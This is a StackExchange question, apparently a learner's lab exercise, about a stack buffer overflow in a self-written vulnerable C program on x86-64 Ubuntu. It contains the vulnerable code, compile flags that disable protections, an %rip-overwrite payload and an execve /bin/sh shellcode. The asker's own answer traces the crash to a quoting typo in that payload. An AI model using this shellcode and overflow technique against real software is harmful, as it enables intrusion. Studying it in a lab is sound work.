{
    "title": "Payload in simple buffer overflow exploit redirecting %rip on x86-64 Ubuntu 16.04 LTS leads to early (meaning before %rip is overwritten) segfault",
    "link": "https://reverseengineering.stackexchange.com/questions/19685/payload-in-simple-buffer-overflow-exploit-redirecting-rip-on-x86-64-ubuntu-16-0",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I am trying to do a simple buffer overflow exploitation by overwriting the instruction pointer %rip.</p>\n<p>Here's my code of vuln.c</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char* argv[])\n{\n\n    char buffer[256];\n    strcpy(buffer, argv[1]);\n    printf(\"%s\\n\", buffer);\n    return 0;\n}\n</code></pre>\n<p>which I compile with </p>\n<pre><code>gcc vuln.c -o vuln -z execstack -fno-stack-protector\n</code></pre>\n<p>As discussed in the question <a href=\"https://reverseengineering.stackexchange.com/questions/19682/x86-64-bit-buffer-overflow-help-with-overwriting-rip\">here</a> I am confident that I am able to control the instruction pointer by feeding something along the lines of </p>\n<pre><code>gdb$ r $(python -c 'print \"A\"*264 + \"\\x7f\\xff\\xff\\xff\\xd8\\xc0\"[::-1]')\n</code></pre>\n<p>to gdb, as this gives me:</p>\n<pre><code>Stopped reason: SIGSEGV\n0x00007fffffffd8c0 in ?? ()\ngdb$ x 0x00007fffffffd8c0\n0x7fffffffd8c0: 0x4141414141414141\ngdb$ \n</code></pre>\n<p>So apparently I managed to redirect execution flow to a place in memory that I wanted.</p>\n<p>Now I want to execute some shellcode at this position. For that I use a execve shellcode that I compiled on the same system I am trying to exploit:</p>\n<pre><code>$ objdump -d spawnshell.o\n\nspawnshell.o:     file format elf64-x86-64\n\nDisassembly of section .text:\n\n0000000000000000 &lt;_start&gt;:\n   0:   48 bb 2f 2f 62 69 6e    movabs $0x68732f6e69622f2f,%rbx\n   7:   2f 73 68 \n   a:   48 c1 eb 08             shr    $0x8,%rbx\n   e:   53                      push   %rbx\n   f:   48 89 e7                mov    %rsp,%rdi\n  12:   50                      push   %rax\n  13:   57                      push   %rdi\n  14:   48 89 e6                mov    %rsp,%rsi\n  17:   b0 3b                   mov    $0x3b,%al\n  19:   0f 05                   syscall \n</code></pre>\n<p>Spawnshell.o is tested on my system and works.</p>\n<p>Written in more compact form:</p>\n<blockquote>\n<p>\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\n  - 27 bytes</p>\n</blockquote>\n<p>Now I would expect that I should be able to inject this at the beginning of my buffer, pad the remaining buffer with \"A\"'s and then again overwrite the instruction pointer in the end:</p>\n<pre><code>gdb$ r $(python -c 'print \"\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\" + A\"*(264-27) + \"\\x7f\\xff\\xff\\xff\\xd8\\xc0\"[::-1]')\n</code></pre>\n<p>If I do this something else that I don't understand happens: I end up somewhere in the __strcpy_sse2_unaligned function at the following command:</p>\n<pre><code>&lt;__strcpy_sse2_unaligned+551&gt; movdqu xmm1,XMMWORD PTR [rsi]\n</code></pre>\n<p>and a segfault:</p>\n<pre><code>Stopped reason: SIGSEGV\n__strcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/strcpy-sse2-unaligned.S:296\n296 ../sysdeps/x86_64/multiarch/strcpy-sse2-unaligned.S: No such file or directory.\n</code></pre>\n<p>So my interpretation is, that the strcpy function is choking on something, even before I get to overwrite the %rip.</p>\n<p>What is it, or how do I go about finding out what the problem is?</p>\n</div>",
    "votes": "1",
    "answers": 1,
    "views": "833",
    "tags": [
        "buffer-overflow",
        "x86-64"
    ],
    "user": "schtopps",
    "time": "Oct 22, 2018 at 18:41",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Good lord, I messed up the quotations: </p>\n<p>[...] x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\" <strong>+ A\"*</strong>(264-27) + \"\\x7f\\x [...]</p>\n<p>Voting to close/delete - sorry.</p>\n</div>",
            "votes": "1",
            "user": "schtopps",
            "time": "Oct 22, 2018 at 18:50",
            "is_accepted": false,
            "comments": []
        }
    ]
}